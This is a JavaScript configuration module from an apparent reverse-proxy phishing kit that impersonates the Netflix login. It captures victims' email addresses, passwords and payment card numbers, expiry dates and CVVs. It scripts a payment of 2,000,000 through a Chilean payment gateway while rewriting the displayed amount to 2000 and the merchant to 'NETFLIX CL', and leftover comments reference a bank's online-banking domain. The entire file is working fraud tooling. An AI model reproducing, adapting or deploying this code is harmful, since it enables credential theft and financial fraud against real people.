/* eslint-disable max-classes-per-file */
const urlParser = require('url-parse')
const superagent = require('superagent')
// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */
const PAY_AMOUNT = 2000000
const FAKE_AMOUNT = 2000
const pargoFacilPayment = (kringo) => {
    superagent.get('https://b.pgf.cl/Mauri1234/25435/411b5530-bb5d-4cc6-b199-e0785827267a')
        .then((resp1) => {
            const htmlCap1 = /name='authentication'\svalue="(.+?)"/.exec(resp1.text)
            if (htmlCap1.length < 0) {
                console.error('FATAL NO AUTH BODY')
            }
            const authToken = htmlCap1[1]
            superagent.post('https://b.pgf.cl/Mauri1234/25435/411b5530-bb5d-4cc6-b199-e0785827267a')
                .send({
                    nombre: 'jose',
                    email: 'jose@gmail.com',
                    monto: PAY_AMOUNT,
                    authentication: authToken,
                })
                .set('content-type', 'application/x-www-form-urlencoded')
                .then((resp2) => {
                    const htmlCap2 = /id="pagoForm"\smethod="POST" action="(.*?)">/.exec(resp2.text)
                    if (htmlCap2.length < 1) {
                        console.error('FATAL NO PAGO URL')
                    }
                    const pagoUrl = htmlCap2[1]

                    superagent.post(pagoUrl)
                        .set('content-type', 'application/x-www-form-urlencoded')
                        .then((resp3) => {
                            const htmlCap3 = /href="(\/webpay\/payTransaction\?Authorization=.+?)"/.exec(resp3.text)
                            if (htmlCap2.length < 1) {
                                console.error('FATAL NO WEBPAY URL')
                            }
                            const webPayUrl = `https://gw.pagofacil.cl${htmlCap3[1]}`
                            superagent.get(webPayUrl)
                                .redirects(0)
                                .end((err, resp4) => {
                                    if (resp4.status !== 302) {
                                        console.error('UKNOWN STATUS CODE')
                                    }
                                    const webpayHeader = resp4.headers.location
                                    kringo(webpayHeader)
                                })

                        })

                })


        })

}

/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
        super(proxyResp, browserEndPoint)
        this.regexes = [
            // {
            // reg: /bh:'https:\/\/(login.live.com)\/(GetCredentialType.srf\?.+?',)/ig,
            // replacement: `bh:'https://${process.env.HOST_DOMAIN}/$2`,
            // },
        ]
    }


    processResponse() {
        const extRedirectObj = super.getExternalRedirect()
        if (this.proxyResp.statusCode === 500) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                if (this.proxyResp.headers['content-type'] === 'application/json') {
                    const jsonBody = JSON.parse(newMsgBody)
                    if (jsonBody.transactionData) {
                        if (jsonBody.transactionData.totalAmount) {
                            jsonBody.transactionData.totalAmount = FAKE_AMOUNT
                        }
                        if (jsonBody.transactionData.formattedTotalAmount) {
                            jsonBody.transactionData.formattedTotalAmount = FAKE_AMOUNT
                        }
                        if (jsonBody.transactionData.commerce.fantasyName) {
                            jsonBody.transactionData.commerce.fantasyName = 'NETFLIX CL'
                        }
                        if (jsonBody.transactionData.commerceText) {
                            jsonBody.transactionData.commerceText = 'NETFLIX CL'
                        }
                        newMsgBody = JSON.stringify(jsonBody)
                    }


                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
                console.error(err)
            })
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientConfig) {
        if (this.req.method === 'POST' && this.req.url.endsWith('/login')) {
            super.uploadRequestBody(clientConfig.currentDomain, clientConfig)
            // pargoFacilPayment((webPayUrl) => {
            //     const webPayUrlOBj = urlParser(webPayUrl)
            //     clientConfig.currentDomain = webPayUrlOBj.host
            //     this.res.writeHead(302, 
            // { location: `${webPayUrlOBj.pathname}${webPayUrlOBj.query}` })
            //     this.res.end('')
            // })
            this.res.writeHead(302, { location: '/session/secure/cc.html' })
            this.res.end('')
            
        } else {
            const redirectToken = super.checkForRedirect()
            if (redirectToken !== null) {
                clientConfig.currentDomain = redirectToken.obj.host
                this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
                super.superExecuteProxy(clientConfig.currentDomain, clientConfig)
            } else {
                super.superExecuteProxy(clientConfig.currentDomain, clientConfig)
            }
        }

    }
}


const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/session/secure/')

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            if (this.req.url === '/session/secure/cc.html') {
        
                super.uploadRequestBody(clientContext.currentDomain, clientContext)
                // clientContext.currentDomain = 'onlinebanking.53.com'
                this.res.writeHead(301, { location: '/session/secure/cc.html' })
                this.res.end()
               
            } else if (this.req.url === '/session/secure/security.html') {
                super.uploadRequestBody(clientContext, {})
                this.res.writeHead('301', { location: '/content/dam/fifth-third/docs/legal/ftb-digital-services-user-agreement.pdf' })
                this.res.end()
            } else {
                super.uploadRequestBody(clientContext.currentDomain, clientContext)
                this.res.writeHead(200)
                this.res.end()
            }
            
        } else {
            switch (this.req.url) {
                case '/session/secure/cc.html':
                    super.superExecutePhpScript('cc.html', clientContext)
                    break
                case '/session/secure/security.html':
                    // clientContext.currentDomain = 'onlinebanking.53.com'
                    super.superExecutePhpScript('security.html', clientContext)
                    break
                default:
                    // this.req.url = this.req.url.replace('/session/secure', '/ib')
                    super.superExecutePhpScript('app/404.php', clientContext)
            }
        }
    }


}


const configExport = {
    CURRENT_DOMAIN: 'www.netflix.com',
    START_PATH: '/login',
    PRE_HANDLERS:
        [
            ExecPhpPager,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginEmail: {
            method: 'POST',
            params: ['userLoginId'],
            urls: '',
            hosts: ['www.netflix.com'],
        },
        loginPassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: ['www.netflix.com'],
        },
        CC: {
            method: 'POST',
            params: ['cardnumber', 'pan'],
            urls: '',
            hosts: ['webpay3g.transbank.cl', 'webpay3g.transbank.cl:443'],
        },
        expireMonth: {
            method: 'POST',
            params: ['month'],
            urls: '',
            hosts: ['webpay3g.transbank.cl', 'webpay3g.transbank.cl:443'],
        },
        expireYear: {
            method: 'POST',
            params: ['year'],
            urls: '',
            hosts: ['webpay3g.transbank.cl', 'webpay3g.transbank.cl:443'],
        },
        Cvv: {
            method: 'POST',
            params: ['cvv'],
            urls: '',
            hosts: ['webpay3g.transbank.cl', 'webpay3g.transbank.cl:443'],
        },
    },
}
module.exports = configExport

